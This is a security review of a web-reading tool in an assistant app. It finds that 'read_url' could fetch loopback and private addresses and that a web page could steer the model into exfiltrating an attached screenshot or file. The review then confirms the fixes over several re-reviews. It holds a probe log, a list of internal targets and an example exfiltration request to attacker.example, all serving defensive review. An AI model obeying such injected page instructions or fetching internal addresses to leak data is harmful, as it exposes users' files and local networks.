# WEB-ACCESS, 0370c2c (Security): FAIL, read_url reaches this PC and the local network, and the bar can now be steered into it

Branch claude/builder-b-web-access, from d235050. I read the diff and the `read_url` code it now offers in Quick ask. On an extract of 0370c2c with an invented profile, `web-access` and `quick-ask-answers-server` pass 6 of 6.

## Part 1, the retry path: fine

- **First retry.** When a provider refuses the full tool list, `streamChat` retries once with `coreTools`: the same list minus every connector tool and the meta tools (`toolIndex`, `META_TOOLS`). For a device, `coreOnly` comes from the already-filtered `fullTools`, so R2's device blocks still hold.
- **Second retry.** Only then does it retry with no tools, adding a system note that says no tools are available. The `offered` and `offeredNames` checks follow `activeTools`, so a call written as text for a dropped tool is answered as "no such tool" and never run.
- **What is remembered.** The refusal level is kept per chat, provider and model. It never widens.

## Part 2, the bar

- **What the bar offers.** It offers exactly `web_search` and `read_url`. `runTool` refuses anything else when `textOnly`, before any other step, and the system text no longer says there are no tools.
- **No card.** Both tools are `read` risk, so no card is ever raised in the bar.
  - The person's rules (`checkToolCall`) only judge workspace tools and `file:` addresses.
  - In the bar there is no workspace, so `read_url` on `file:` is refused ("cannot read files on this computer in Chat mode").

### WA-1 (MEDIUM, required): `read_url` fetches loopback and private addresses, and follows redirects

`readUrl` (`src/server/pluginImport.js:198`) checks only that the address starts with `http` or `https`, then calls `fetch`. That means:
- no private-address check;
- redirects followed automatically;
- no pinned DNS.

`download_file` already has the right guard: `isPrivateAddress`, a DNS lookup pinned to the checked address, and refusal of Bunny's own ports. `read_url` doesn't use it.

The bar now offers `read_url` with no card, and its whole input is the person's question plus web pages the model reads. So a page the model reads (untrusted text) can make it fetch any of these and read back the answer:
- the router's admin page;
- a NAS or printer on the network;
- `169.254.169.254`;
- a service on this PC's `localhost`.

Bunny's own window server is protected by S-1: a fetch with no token gets nothing. Its HTML pages get the token injected, but `readUrl` strips tags, and the `<meta>` with them. Other local services have no such guard.

Probe (`docs/security/web-access-probe/read-url-private.mjs` on 0370c2c, against a stand-in "admin page" on 127.0.0.1):

    http://127.0.0.1:<port>/admin -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2
    http://localhost:<port>/admin -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2
    http://127.0.0.1:<port>/hop -> READ: ROUTER-ADMIN-PAGE: wifi password hunter2   (a redirect to it)

**Fix:**
- Give `read_url` `download_file`'s request path: `isPrivateAddress` on literals and on every DNS answer, the socket pinned to the checked address, and Bunny's own ports refused.
- Follow redirects by hand (`redirect: 'manual'`, at most 5), checking each hop the same way.
- Keep the 15 s limit and the 12,000-character cap.

This gap is older than this change: the chat's `read_url` has it too, at read risk. Fix it in the shared `readUrl`, so both get it.

### WA-2 (MEDIUM, required for the bar): untrusted pages plus the person's attachment plus `read_url` is a way out

The bar can carry a screenshot or a file (W4-8b). With `read_url` and no card, a page the model reads can tell it to `read_url https://attacker.example/?d=<what the screenshot or file says>`, and the request leaves with no click.

**Fix, either one:**
- In the bar, `read_url` only fetches an address that appears in the person's own text or in a `web_search` result from this same answer (exact match, before redirects).
- Or a bar question with a screenshot or file attached gets no tools, as before this change. The bar says "Searching the web is off when something is attached".

(The chat has the same pattern today. That is a follow-up for its own piece, where the person sees each step. In the bar nothing is shown before it happens.)

## Verdict

FAIL at 0370c2c, for WA-1 and WA-2. Part 1, the retry path, and the bar's two-tool limit are correct. A re-review needs the fix diff, this probe refusing all three addresses, and a test for WA-2.

## Re-review at a49d800: PASS (supersedes the FAIL at 0370c2c)

Commits: c571a03 (WA-1) and a49d800 (WA-2).

- **WA-1 fixed.** `readUrl` now fetches through `download.js` `fetchLimited`:
  - `isPrivateAddress` on literals and on every DNS answer, with the socket pinned to the checked address;
  - Bunny's own ports refused;
  - redirects followed one at a time (at most 5), each hop checked;
  - a 5 MB cap.

  The tool path (`appTools`: `read_url: ({ url }) => readUrl(url)`) passes no `fetchImpl`, so the guarded path always runs. The `fetchImpl` stand-in is for tests only. `readUrl` is shared, so the chat is fixed too. My probe on a49d800:

      http://127.0.0.1:<port>/admin -> refused: 127.0.0.1 is on this computer or a private network; read_url only fetches public addresses.
      http://localhost:<port>/admin -> refused: localhost is on this computer or a private network; …
      http://[::1]:<port>/admin -> refused: [::1] is on this computer or a private network; …
      http://127.0.0.1:<port>/hop -> refused: 127.0.0.1 is on this computer or a private network; …

- **WA-2 fixed (option a).** In a quick answer, `read_url` opens only an address whose normalised `URL.href` exactly equals:
  - one in the person's own message;
  - or one on a link line of this answer's own `web_search` output.

  The model can't add a path or query, so nothing it read can ride out in the address. A redirect target is chosen by the server, not the model. Builder B's tests cover:
  - an attachment with a page-instructed `?d=` (refused);
  - a listed address with `?d=` added (refused);
  - an address that appears only in a snippet (refused);
  - the exact listed address (allowed).
- **Also:** 5 look-ups per quick answer, and the bar never waits on a repeat-step card.
- **Residual, accepted:** the text of a `web_search` query goes to the search provider (DuckDuckGo). The model could put attached text into a query, but the provider isn't an address a page chooses, and the query never reaches the page's author.
- **Tests:** `web-access`, `web-access-ssrf`, `quick-ask-answers-server` and `agent-tools` pass 21 of 21 on an extract with an invented profile.

Verdict: PASS at a49d800.

## Re-stamp at 0f24a08: PASS (supersedes a49d800)

- 0f24a08 hardens WA-2's list of allowed addresses.
  - `webSearch`'s `strip()` now collapses all whitespace, so a page's title or snippet is always one line and can't forge a "two spaces + URL" link line. JS `\s` also covers U+2028 and U+2029.
  - A result link that contains whitespace or control characters after `uddg` decoding is left off the list.
- Even before this fix, a forged line could only list a fixed address the page's author wrote in advance. It could carry no data from the person, so WA-2's exfiltration route stayed closed. This removes the forged listing anyway.
- **Note:** the commit rewrites `src/server/appTools.js` with CRLF line endings. The real change is 2 lines, which `git diff --ignore-cr-at-eol` shows. Builder B should restore LF so later reviews and blame stay readable.
- **Tests:** `web-access`, `web-access-ssrf`, `quick-ask-answers-server` and `agent-tools` pass 22 of 22 on an extract with an invented profile. The structured `{ text, links }` result isn't required.

Verdict: PASS at 0f24a08.

## Re-stamp at 75912d6: PASS (supersedes 0f24a08)

- 75912d6 only restores LF in `src/server/appTools.js`. `git diff --ignore-cr-at-eol 0f24a08 75912d6` is empty.
- Against a49d800, the source change is 2 insertions and 1 deletion in `appTools.js`, plus 15 test lines.
- `test/web-access-ssrf.test.js` is still CRLF (from 0f24a08). That's cosmetic, for Builder B to tidy.
- `web-access-ssrf` and `web-access` pass 9 of 9 on an extract with an invented profile.

Verdict: PASS at 75912d6.
